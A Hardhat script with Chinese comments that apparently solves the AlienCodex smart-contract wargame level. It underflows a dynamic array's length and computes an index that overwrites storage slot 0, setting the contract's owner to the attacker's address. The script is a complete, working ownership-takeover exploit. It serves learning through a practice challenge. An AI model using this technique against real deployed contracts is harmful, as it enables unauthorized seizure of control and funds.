import hre from "hardhat";
const { ethers } = hre;

// Change your target address
const ALIEN_CODEX_ADDRESS = "0x0292a45140694F44B5194417A005966b1f0309C5";

async function main() {
    const [signer] = await ethers.getSigners();
    console.log("我的帳戶地址 : ", signer.address);

    const alienCodex = await ethers.getContractAt("AlienCodex", ALIEN_CODEX_ADDRESS);
    console.log("AlienCodex 關卡實例地址: ", alienCodex.target);
    console.log("AlienCodex owner : ", await alienCodex.owner());

    // 1. makeContact
    let tx = await alienCodex.makeContact();
    await tx.wait();

    // 2. underflow length
    tx = await alienCodex.retract();
    await tx.wait();

    /*
    def storage:
        contact is uint8 at storage 0 offset 160
        owner is addr at storage 0
        codex is array of uint256 at storage 1  

    計算想寫到 slot 0（owner）的 index，在 Solidity 裡，動態陣列 codex 的資料是從
    keccak256(slot_of_codex) + 0, 1, 2, ... 開始
    我們想寫到 slot 0，也就是找一個 i 使得：
    keccak256(1) + i ≡ 0    (mod 2^256)
    ⇒ i = 2^256 - keccak256(1)
    */
    
    const codexArrayStorageSlot = "0x0000000000000000000000000000000000000000000000000000000000000001";
     // 3. 計算 index = 2^256 - keccak256(1)
     // 這裡回傳的是 hex of keccak256(1)
    const codexDataStartStorageSlot = ethers.keccak256(codexArrayStorageSlot); 

    const NUMBER_OF_SLOTS = BigInt(2) ** BigInt(256);
    const ownerPositionInMap = NUMBER_OF_SLOTS - BigInt(codexDataStartStorageSlot);
    console.log("codexDataStartStorageSlot : ", codexDataStartStorageSlot);
    console.log("ownerPositionInMap : ", ownerPositionInMap);

    // 4. 把 owner (slot0) 改成 attacker.address
    //    先把 address 填成 32 bytes
    const parsedAddress = ethers.zeroPadValue(signer.address, 32)
    console.log("parsedAddress : ", parsedAddress);

    tx = await alienCodex.revise(ownerPositionInMap, parsedAddress);
    await tx.wait();

    // 檢查一下 owner
    console.log("AlienCodex owner : ", await alienCodex.owner());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});